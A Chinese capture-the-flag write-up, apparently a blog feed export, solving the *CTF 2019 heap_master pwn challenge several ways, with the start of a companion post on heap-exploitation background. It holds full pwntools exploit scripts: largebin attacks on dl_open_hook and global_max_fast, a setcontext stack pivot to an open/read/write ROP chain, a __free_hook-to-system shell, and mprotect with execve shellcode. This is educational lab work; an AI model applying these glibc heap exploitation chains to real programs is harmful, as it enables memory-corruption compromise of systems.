这题如果可以直接拿shell倒也不是很难，我觉得难点主要在于两方面，一方面是环境是2.25，对我这种一直用虚拟机的玩家来说怎么在ubuntu16.04上运行2.25的libc和ld.so是需要面对的第一个问题，好在这个已经得到初步解决（看e3pme的文章），一方面是orw让我们必须劫持栈rsp到mmap的我们自己已经填好rop_chain的地址上，加上找gadgets等一系列麻烦事，使难度上了一个档次。 第二种方法：第二种方法的泄露方法和第一种方法一样，但是改变了控制程序执行流的方法。 思路分析：第二种方法我们使用modify dl_open_hook的方法来劫持程序控制流，利用largebin_attack将dl_open_hook覆盖为victim的地址，因为当malloc和free报错时，会调用__libc_dlopen_mode函数，在其中会将dl_open_hook的值赋给一个寄存器，然后会call [寄存器]，也就等于是call [victim_addr]，所以我们可以在victim的地址处填好one_gadget或者gadgets来劫持程序控制流。 因为dl_open_hook赋值给的寄存器因libc版本不同而不同，我们调试发现在libc2.25中赋值给的寄存器是rbx。调试确定是哪个寄存器的方法是： rwatch *addr_dl_open_hook c 程序会卡到*addr_dl_open_hook参与操作的那一条指令。我们可以发现在libc2.25是rbx，libc2.23是rax。 我们发现在libc2.25下发现了： 1230x7FD7D: mov rdi, [rbx+48h] mov rsi, r13 call qword ptr [rbx+40h] 这个gadget我们可以完全控制住rdi和程序执行流，和setcontext+53结合，我们可以控制所有寄存器并劫持栈，但是在libc2.23版本因为找不到合适的gadget与rax配合，所以暂时未解出，希望有师傅解出能让我借鉴一下。 exp如下(libc-2.25)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\x00')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)elf = change_ld('./heap_master','./ld-linux-x86-64.so.2')p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;)def new(size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(size))def upgrade(offset,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('offset: ') p.sendline(str(offset)) p.recvuntil('size: ') p.sendline(str(len(content))) p.recvuntil('content: ') p.send(content)def delete(offset): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('offset: ') p.sendline(str(offset)) def mypwn(): stdout = 0x2600 libc = ELF('./libc-2.25.so') offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(stdout-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(stdout-0x20+0x19)) delete(offset+0x10) new(0x60) mmap_addr = u64(p.recv(8)) - (0xdffa3800- 0xdff9e000) log.success('mmap_addr = '+hex(mmap_addr)) libcbase = u64(p.recv(8)) - (0x7f7684c72683-0x7f76848d4000) log.success('libcbase = '+hex(libcbase)) setcontext = libcbase + 0x43565 log.success('setcontext+53 = '+hex(setcontext)) dl_open_hook_addr = libcbase + (0x7fa15b2162e0-0x7fa15ae74000) log.success('dl_open_hook_addr = '+hex(dl_open_hook_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x20)) delete(offset+0x10) new(0x60) choice = 2 #1. one_gadget 全部失败 2. orw if choice == 1: one_gadget = [0x40bdb,0x40c2f,0xd9925] upgrade(offset,p64(libcbase+one_gadget[2])) if choice == 2: ''' 0x7ffff7a7a565 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0] 0x7ffff7a7a56c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80] 0x7ffff7a7a573 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78] 0x7ffff7a7a577 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48] 0x7ffff7a7a57b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50] 0x7ffff7a7a57f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58] 0x7ffff7a7a583 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60] 0x7ffff7a7a587 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8] 0x7ffff7a7a58e &lt;setcontext+94&gt;: push rcx 0x7ffff7a7a58f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70] 0x7ffff7a7a593 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88] 0x7ffff7a7a59a &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98] 0x7ffff7a7a5a1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28] 0x7ffff7a7a5a5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30] 0x7ffff7a7a5a9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68] 0x7ffff7a7a5ad &lt;setcontext+125&gt;: xor eax,eax 0x7ffff7a7a5af &lt;setcontext+127&gt;: ret ''' mygadget = 0x7fd7d + libcbase #0x000000000007fd7d: mov rdi, qword ptr [rbx + 0x48]; mov rsi, r13; call qword ptr [rbx + 0x40]; p_rdi = libcbase + 0x1feea p_rdx_rsi = libcbase + 0xf9619 orw = [ p_rdi,mmap_addr, p_rdx_rsi,0,0, libcbase+libc.sym['open'], p_rdi,4, #我flag打开之后文件操作符是4，具体情况自己调试 p_rdx_rsi,0x100,mmap_addr+0x2000, libcbase+libc.sym['read'], p_rdi,1, p_rdx_rsi,0x100,mmap_addr+0x2000, libcbase+libc.sym['write'], ] upgrade(0,'./flag\x00\x00'+flat(orw)) upgrade(offset,p64(mygadget)) upgrade(offset+0x40,p64(setcontext)+p64(mmap_addr+0x1000)) upgrade(0x1000+0xa0,p64(mmap_addr+0x10)+p64(p_rdi)) #gdb.attach(p) delete(0x10) p.interactive()while True: try: mypwn() break except: p.close() elf = change_ld('./heap_master','./ld-linux-x86-64.so.2') p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;) 第三种方法：思路：第三种方法主要与前面的泄露方式不同。 第三种方法是先利用unsortedbin_attack/largebin_attack将任意地址修改为victim的地址，我们准备改写global_fast_max，然后突破fastbinY[]的限制，产生fastbin_index_overflow将stdout流modify为某一处mmap的地址（我们事先已应在这里伪造好一个fake_IO_2_1_stdout结构体），然后有1/16的概率可以成功泄露。 exp如下：12 第四种方法：思路：第四种方法和前面的方法不同点主要在于劫持程序控制流，泄露的方法在前面都已经明确了，在此就不赘述。 第四种方法劫持程序执行流的方法是先改写global_fast_max，然后向free_hook放入victim的地址，然后在victim处构造一个chunk，在这个chunk的fd指针处改为system_addr，将这个chunk申请出来，这时system_addr就放入了free_hook中，然后再构造一个chunk，使其首八个字节为&#39;/bin/sh\x00&#39;，free()其即可打开shell。 exp如下(libc-2.23)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125#coding:utf-8from pwn import *context(os='linux',arch='amd64')context.terminal = ['terminator','-x','sh','-c']#context.log_level = 'debug'p = process('./heap_master')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new(size): p.sendlineafter('&gt;&gt; ', '1') p.sendlineafter('size: ', str(size))def upgrade(offset,content): p.sendlineafter('&gt;&gt; ', '2') p.sendlineafter('offset: ', str(offset)) p.sendlineafter('size: ', str(len(content))) p.sendafter('content: ', content) def delete(offset): p.sendlineafter('&gt;&gt; ', '3') p.sendlineafter('offset: ', str(offset))def exp(): offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(0x2620-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(0x2620-0x20+0x19)) delete(offset+0x10) new(0x60) p.recv(0x18) libcbase = u64(p.recv(8)) - (0x7f1f383306e0-0x7f1f37f6d000) log.success('libcbase = '+hex(libcbase)) mmap_addr = u64(p.recv(4).ljust(8,'\x00')) - (0xb800-0x6000) log.success('mmap_addr = '+hex(mmap_addr)) #------------------------------leak success and largebin_attack again--------------- global_max_fast_addr = libcbase + (0x7f6c57ea37f8 - 0x7f6c57add000) log.success('global_max_fast_addr = '+hex(global_max_fast_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(global_max_fast_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(global_max_fast_addr-0x20)) delete(offset+0x10) new(0x60) fastbin_ptr = libcbase+(0x7fc6d8510b20-0x7fc6d814c000)+8 log.success('fastbin_ptr = '+hex(fastbin_ptr)) target_addr = libcbase+libc.sym['__free_hook'] log.success('free_hook_addr ='+hex(target_addr)) idx = (target_addr-fastbin_ptr)/8 size = idx*0x10 + 0x20 offset = 0x2000 upgrade(offset+8,p64(size+1)) upgrade(offset+8+size,p64(0x31)+'/bin/sh\x00') upgrade(offset+8+size+0x30,p64(0x31)) delete(offset+0x10) upgrade(offset+8+8,p64(libcbase+libc.sym['system'])) new(size-0x10) delete(offset+size+0x10) p.interactive()if __name__ == '__main__' : while True: try : exp() break except : p.close() p = process('./heap_master') 第五种方法：思路：第五种方法也是劫持程序控制流方法不同。 第五种方法我们在泄露之后，改写_IO_list_all来控制程序控制流之后，利用_IO_str_overflow来跳到setcontext+53，然后控制寄存器调用mprotect来改写mmap段的权限，然后在mmap上注入shellcode。 exp如下(libc-2.25)：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190#coding:utf-8from pwn import *context(os='linux',arch='amd64')#context.log_level = 'debug'context.terminal = ['terminator','-x','sh','-c']def change_ld(binary, ld): """ Force to use assigned new ld.so by changing the binary """ if not os.access(ld, os.R_OK): log.failure("Invalid path &#123;&#125; to ld".format(ld)) return None if not isinstance(binary, ELF): if not os.access(binary, os.R_OK): log.failure("Invalid path &#123;&#125; to binary".format(binary)) return None binary = ELF(binary) for segment in binary.segments: if segment.header['p_type'] == 'PT_INTERP': size = segment.header['p_memsz'] addr = segment.header['p_paddr'] data = segment.data() if size &lt;= len(ld): log.failure("Failed to change PT_INTERP from &#123;&#125; to &#123;&#125;".format(data, ld)) return None binary.write(addr, ld.ljust(size, '\x00')) if not os.access('/tmp/pwn', os.F_OK): os.mkdir('/tmp/pwn') path = '/tmp/pwn/&#123;&#125;_debug'.format(os.path.basename(binary.path)) if os.access(path, os.F_OK): os.remove(path) info("Removing exist file &#123;&#125;".format(path)) binary.save(path) os.chmod(path, 0b111000000) #rwx------ success("PT_INTERP has changed from &#123;&#125; to &#123;&#125;. Using temp file &#123;&#125;".format(data, ld, path)) return ELF(path)elf = change_ld('./heap_master','./ld-linux-x86-64.so.2')p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;)def new(size): p.recvuntil('&gt;&gt; ') p.sendline('1') p.recvuntil('size: ') p.sendline(str(size))def upgrade(offset,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('offset: ') p.sendline(str(offset)) p.recvuntil('size: ') p.sendline(str(len(content))) p.recvuntil('content: ') p.send(content)def delete(offset): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('offset: ') p.sendline(str(offset)) def mypwn(): stdout = 0x2600 libc = ELF('./libc-2.25.so') offset = 0x5800 upgrade(offset+8,p64(0x411)) #1 upgrade(offset+8+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30,p64(0x411)) #2 upgrade(offset+8+0x410+0x30+0x410,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30,p64(0x201)) #3 upgrade(offset+8+0x410+0x30+0x410+0x30+0x200,p64(0x31)) upgrade(offset+8+0x410+0x30+0x410+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x410+0x30) delete(offset+0x10+0x410+0x30+0x410+0x30) new(0x10) upgrade(offset+8+0x410+0x30,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x410+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x410+0x30) new(0x60) delete(offset+0x10+0x410+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x410+0x30,p64(0x3f1)) upgrade(offset+0x10+0x410+0x30,p64(0)+p16(stdout-0x10)) upgrade(offset+0x20+0x410+0x30,p64(0)+p16(stdout-0x20+0x19)) delete(offset+0x10) new(0x60) mmap_addr = u64(p.recv(8)) - (0xdffa3800- 0xdff9e000) log.success('mmap_addr = '+hex(mmap_addr)) libcbase = u64(p.recv(8)) - (0x7f7684c72683-0x7f76848d4000) log.success('libcbase = '+hex(libcbase)) setcontext = libcbase + 0x43565 log.success('setcontext+53 = '+hex(setcontext)) dl_open_hook_addr = libcbase + (0x7fa15b2162e0-0x7fa15ae74000) log.success('dl_open_hook_addr = '+hex(dl_open_hook_addr)) offset = 0x8800 upgrade(offset+8,p64(0x511)) #1 upgrade(offset+8+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30,p64(0x511)) #2 upgrade(offset+8+0x510+0x30+0x510,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30,p64(0x201)) #3 upgrade(offset+8+0x510+0x30+0x510+0x30+0x200,p64(0x31)) upgrade(offset+8+0x510+0x30+0x510+0x30+0x200+0x30,p64(0x31)) delete(offset+0x10+0x510+0x30) delete(offset+0x10+0x510+0x30+0x510+0x30) new(0x10) upgrade(offset+8+0x510+0x30,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100,p64(0x101)*3) upgrade(offset+8+0x510+0x30+0x100+0x100,p64(0x101)*3) delete(offset+0x20+0x510+0x30) new(0x60) delete(offset+0x10+0x510+0x30) new(0x80) new(0xf0) upgrade(offset+8+0x510+0x30,p64(0x4f1)) upgrade(offset+0x10+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x10)) upgrade(offset+0x20+0x510+0x30,p64(0)+p64(dl_open_hook_addr-0x20)) delete(offset+0x10) new(0x60) ''' 0x7ffff7a7a565 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0] 0x7ffff7a7a56c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80] 0x7ffff7a7a573 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78] 0x7ffff7a7a577 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48] 0x7ffff7a7a57b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50] 0x7ffff7a7a57f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58] 0x7ffff7a7a583 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60] 0x7ffff7a7a587 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8] 0x7ffff7a7a58e &lt;setcontext+94&gt;: push rcx 0x7ffff7a7a58f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70] 0x7ffff7a7a593 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88] 0x7ffff7a7a59a &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98] 0x7ffff7a7a5a1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28] 0x7ffff7a7a5a5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30] 0x7ffff7a7a5a9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68] 0x7ffff7a7a5ad &lt;setcontext+125&gt;: xor eax,eax 0x7ffff7a7a5af &lt;setcontext+127&gt;: ret rsp = [rdi+0xa0] ret_addr = [rdi+0xa8] #push rcx; ......... ret; 开始的rcx作为缓冲区，必须装指令的地址。 rsi = [rdi+0x70] rdx = [rdi+0x88] rcx = [rdi+0x98] r8 = [rdi+0x28] r9 = [rdi+0x30] ''' mygadget = 0x7fd7d + libcbase #0x000000000007fd7d: mov rdi, qword ptr [rbx + 0x48]; mov rsi, r13; call qword ptr [rbx + 0x40]; shellcode = '\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05' upgrade(offset,p64(mygadget)) upgrade(offset+0x40,p64(setcontext)+p64(mmap_addr+0x1000)) upgrade(0x1000+0xa0,p64(mmap_addr+0x2000)+p64(libcbase+libc.sym['mprotect'])) upgrade(0x1000+0x68,p64(mmap_addr+0x2000)+p64(0x1000)) #rdi rsi upgrade(0x1000+0x88,p64(7)) #rdx upgrade(0x2000,p64(mmap_addr+0x2008)+shellcode) delete(0x10) p.interactive()while True: try: mypwn() break except: p.close() elf = change_ld('./heap_master','./ld-linux-x86-64.so.2') p = elf.process(env=&#123;'LD_PRELOAD':'./libc-2.25.so'&#125;) 总结：唉，其实一路看下来的话其实所谓的多解就是两种泄露方式和三四种劫持程序控制流的方式进行排列组合罢了，融会贯通了其实五种方法就是一种方法。 leak方式： 改写stdout流的关键字节，使flag过了检查f-&gt;flag &amp; 0xa00 and f-&gt;flag &amp; 0x1000 == 1，并且_IO_write_base!=_IO_write_ptr。 在我们可控的地址上劫持伪造stdout流。 modify方式： 改写dl_open_hook，获得一次任意地址call的机会，然后配合setcontext+53控制寄存器，在malloc或者free出错，调用malloc_printerr时会trigger。 改写_IO_list_all，伪造_IO_FIFE_plus结构体，将vtable改为_IO_str_jumps的地址，然后在_IO_str_overflow或者_IO_str_finish里进行劫持。（malloc printerr/exit()/main return-&gt;__libc_message-&gt;abort-&gt;_IO_flush_all_lockp-&gt;_IO_str_overflow/_IO_str_finish），需要过一系列fflush的检查，固定构造已经在前面给出。 改写global_max_fast，突破fastbinY[]的限制，像任意（几乎）地址写victim的地址，可以改写某个hook来进行进一步操作。 参考资料：深入分析 IO_FILE 与 Unosrtbin Largebin attack 的结合利用 starctf-heap_master题解–e3pem Startctf2019_Heap_master–n132 JarvisOJ Pwn Writeup–m4x Largebin学习–veritas501 global_max_fast学习–raycp 新手向——IO_file全流程浅析 (这篇文章里在分析_IO_str_overflow时有错误orz，可能会误导人。)]]></content>
  </entry>
  <entry>
    <title><![CDATA[5种方法解2019_*ctf_heap_master来加深对深层次堆利用手段的理解（完成度80%）]]></title>
    <url>%2F2019%2F07%2F05%2F5%E7%A7%8D%E6%96%B9%E6%B3%95%E8%A7%A3heap_master%2F</url>
    <content type="text"><![CDATA[作为2019年*ctf的倒数第二题pwn题，这道题的程序逻辑却意外的简单，这也就意味着利用起来会有不小的困难（一般程序复杂的题洞难找但利用起来不会太过刁难，程序简单的题利用起来反而困难）。 这道heap_master从名字看就知道需要对ptmalloc2的机制和堆的各种利用方法都非常熟悉才能成为heap的master而不是heap_baby。。QAQ。。。这篇文章也算是集百家之长了。。。借鉴了天枢的师傅和其他一些大师傅的wp，又查了许多资料才汇总出这一篇拙作。 heap_master 一些必须知道的前置知识准备和利用手段：global_fast_max:简答的来说global_fast_max就是一个全局变量，他的作用是控制fastbinY[]的阈值，正常情况下其值为0x80，也就是大小在0x80之内的都可以放进fastbinY[]里，所以如果更改了global_max_fast的值，那fastbinY[]的范围将超标，实现fastbin_index_overflow，所以当我们free一个size极大且经过精心构造的victim_chunk时，就实现了可以几乎任意地址（在main_arena+88之后）写入victim_chunk的地址，之后比较常见的几种利用方式是： 改写_IO_list_all，伪造_IO_file_plus来劫持程序控制流。 改写stdout流，使其指向我们可控的地址，并在其上伪造一个IO_file_plus，常用来泄露libcbase。 stdin同上，但可以用来任意地址写。 stderr同上，但有更多的姿势。 改写__free_hook为system_addr，第五种方法就是利用这个。 size的计算方式为： 123fastbin_ptr = main_arena_addr + 8idx = (target_addr - fastbin_ptr) / 8 #target_addr为我们想要写入的地址。size = idx*0x10 + 0x20 #size为我们应该free的chunk的大小。 dl_open_hook:这种控制程序执行的方式是官方wp里面提到的，通过largebin attack/unsortedbina attack可以将_dl_open_hook覆盖为mmap出来的内存的地址，然后通过malloc或free报错的方式（也就是malloc_printerr），程序将会调用__libc_dlopen_mode函数，在其中会把dl_open_hook的值加载到某个寄存器，然后会call该寄存器，也就是我们获得一次劫持程序ip的机会，但是寄存器们却没法控制，需要和下面我们要讲的setcontext结合来使用才能发挥最大威力。图片来源e3pem setcontext:在pwndbg的magic功能中，我们看到有setcontext+0x35这个变量，现在终于用到了。 看一下这个玩意到底是啥： 12345678910111213141516170x7ffff7a7a565 &lt;setcontext+53&gt;: mov rsp,QWORD PTR [rdi+0xa0]0x7ffff7a7a56c &lt;setcontext+60&gt;: mov rbx,QWORD PTR [rdi+0x80]0x7ffff7a7a573 &lt;setcontext+67&gt;: mov rbp,QWORD PTR [rdi+0x78]0x7ffff7a7a577 &lt;setcontext+71&gt;: mov r12,QWORD PTR [rdi+0x48]0x7ffff7a7a57b &lt;setcontext+75&gt;: mov r13,QWORD PTR [rdi+0x50]0x7ffff7a7a57f &lt;setcontext+79&gt;: mov r14,QWORD PTR [rdi+0x58]0x7ffff7a7a583 &lt;setcontext+83&gt;: mov r15,QWORD PTR [rdi+0x60]0x7ffff7a7a587 &lt;setcontext+87&gt;: mov rcx,QWORD PTR [rdi+0xa8]0x7ffff7a7a58e &lt;setcontext+94&gt;: push rcx0x7ffff7a7a58f &lt;setcontext+95&gt;: mov rsi,QWORD PTR [rdi+0x70]0x7ffff7a7a593 &lt;setcontext+99&gt;: mov rdx,QWORD PTR [rdi+0x88]0x7ffff7a7a59a &lt;setcontext+106&gt;: mov rcx,QWORD PTR [rdi+0x98]0x7ffff7a7a5a1 &lt;setcontext+113&gt;: mov r8,QWORD PTR [rdi+0x28]0x7ffff7a7a5a5 &lt;setcontext+117&gt;: mov r9,QWORD PTR [rdi+0x30]0x7ffff7a7a5a9 &lt;setcontext+121&gt;: mov rdi,QWORD PTR [rdi+0x68]0x7ffff7a7a5ad &lt;setcontext+125&gt;: xor eax,eax0x7ffff7a7a5af &lt;setcontext+127&gt;: ret 我们可以看到这一段巨型gadget，几乎控制了我们所有的寄存器，只要我们可以控制rdi所指向的地址及其后0xa8的内容，就可以劫持程序执行流了。其中这几个位置比较重要： 12345678rsp = [rdi+0xa0]ret_addr = [rdi+0xa8] #push rcx; ......... ret; 开始的rcx作为缓冲区，必须装指令的地址。rdi = [rdi+0x68]rsi = [rdi+0x70]rdx = [rdi+0x88]rcx = [rdi+0x98]r8 = [rdi+0x28]r9 = [rdi+0x30] __after_morecore_hook:chroot:chroot作用：chroot命令改变其当前目录，并将根目录变为指定目录，然后如果提供了命令则运行命令，也可以运行一个用户的交互式shell的副本。由chroot创造出的那个根目录，叫做“chroot监狱”（chroot jail，或chroot prison） 这道题就使用了chroot来使我们没法拿shell，只能通过orw来读取flag。 timeout 60 chroot –userspec=pwn:pwn ./ ./heap_master 因为新的根目录下没有bin。 mprotect与mmap:两个函数的man手册描述： 123456789101112131415161718192021222324252627282930NAME mprotect — set protection of memory mappingSYNOPSIS #include &lt;sys/mman.h&gt; int mprotect(void *addr, size_t len, int prot);DESCRIPTION The mprotect() function shall change the access protections to be that speci‐ fied by prot for those whole pages containing any part of the address space of the process starting at address addr and continuing for len bytes. The parame‐ ter prot determines whether read, write, execute, or some combination of accesses are permitted to the data being mapped. The prot argument should be either PROT_NONE or the bitwise-inclusive OR of one or more of PROT_READ, PROT_WRITE, and PROT_EXEC.NAME mmap — map pages of memorySYNOPSIS #include &lt;sys/mman.h&gt; void *mmap(void *addr, size_t len, int prot, int flags, int fildes, off_t off);DESCRIPTION The mmap() function shall establish a mapping between an address space of a process and a memory object. mprotect函数用于改变某段地址的权限（rwxp） 这道题目开启了 NX 保护，因此可以考虑通过mprotect改变mmap_addr的权限，然后注入shellcode再劫持程序执行流，mprotect指定的内存区必须包含整个内存页，区间长度必须是页大小的整数倍，重点介绍如何使用mprotect。 函数原型是int mprotect(void *addr, size_t len, int prot);，addr是内存地址开头，len 是长度，prot 就是权限位，在 manpage 上有 PROT_WRITE、PROT_EXEC、PROT_READ 等几项，权限是位运算之后的数字，根据宏定义， rwx权限 就是 0x1 | 0x2 | 0x4，也就是7。 mmap用于申请一段空间，根据参数不同可以设置这段空间的权限。 mmap可以申请一段空间，但麻烦在需要控制 6 个参数，对 64 位的程序而言，也就是需要找到能控制 rdi, rsi, rdx, rcx, r8, r9 的 gadget，大部分情况是需要和setcontext+53配合使用。具体使用方法我就不赘述了。 _IO_str_jumps与_IO_list_all：_IO_file_pwn是现在最常用的pwn手段之一，因为没有程序能离开他，只要有输入输出函数和报错(malloc_printerr，exit()甚至main return)的机会，就有可能使用到_IO_file_pwn。之前也做了不少题目关于这个方面的，在这里终于有机会自己总结一下了。。。先亮出三个结构体。 12345struct _IO_FILE_plus&#123; _IO_FILE file; IO_jump_t *vtable;&#125; 1234567891011121314151617181920212223242526272829struct 